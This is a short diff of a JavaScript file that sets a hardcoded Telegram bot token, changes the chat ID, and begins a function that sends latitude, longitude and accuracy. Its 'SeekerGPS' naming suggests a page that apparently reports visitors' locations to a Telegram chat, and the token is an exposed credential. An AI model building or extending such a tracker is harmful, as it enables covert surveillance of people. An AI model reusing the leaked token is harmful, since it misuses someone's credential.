@@ -6,7 +6,7 @@ const result = document.getElementById("result");
 const BOT_TOKEN = "9128144124:AAFCpamQW1MwSlMt3jwC_9QMTiupd1XIEnY";
 
 // Insert your Telegram numeric chat ID here
-const CHAT_ID = "SeekerGPS_TestBot";
+const CHAT_ID = "9048956699";
 
 
 async function sendLocation(latitude, longitude, accuracy) {
